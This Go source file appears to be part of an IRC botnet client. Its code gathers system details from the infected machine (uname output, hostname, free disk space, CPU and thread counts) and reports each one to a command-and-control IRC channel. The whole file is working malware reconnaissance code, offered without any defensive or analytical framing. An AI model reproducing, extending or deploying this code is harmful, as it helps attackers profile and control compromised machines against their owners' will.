package pkg

import (
	"fmt"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strconv"

	"golang.org/x/sys/unix"
)

type botsysteminfo struct {
	sys, hn, fds string
	ncpu         int
}

func freeDiskSpace(wd string) uint64 {
	var stat unix.Statfs_t
	unix.Statfs(wd, &stat)
	return stat.Bavail * uint64(stat.Bsize) / 1024 / 1024 / 1024
}

func sysInfo(reportIRC net.Conn, set_chan string) string {
	cmd, err := exec.Command("uname", "-a").Output()
	if err != nil {
		IRC_Report(reportIRC, set_chan, "Get system infomation is failed...")
	}
	return string(cmd)
}

func (inf botsysteminfo) threadsNumber() string {
	return strconv.Itoa(inf.ncpu * 2)
}

func ReportInf(reportIRC net.Conn, set_chan string) {
	hName, _ := os.Hostname()
	wd, _ := os.Getwd()

	_botsysteminfo := botsysteminfo{
		sys:  sysInfo(reportIRC, set_chan),
		hn:   hName,
		fds:  fmt.Sprint(freeDiskSpace(wd)),
		ncpu: runtime.NumCPU(),
	}

	IRC_Report(reportIRC, set_chan, "System: "+_botsysteminfo.sys)
	IRC_Report(reportIRC, set_chan, "Host Name: "+_botsysteminfo.hn)
	IRC_Report(reportIRC, set_chan, "Free Disk Space (GB): "+_botsysteminfo.fds)
	IRC_Report(reportIRC, set_chan, "Number of CPUs: "+strconv.Itoa(_botsysteminfo.ncpu))
	IRC_Report(reportIRC, set_chan, "Number of Threads: "+_botsysteminfo.threadsNumber())
}
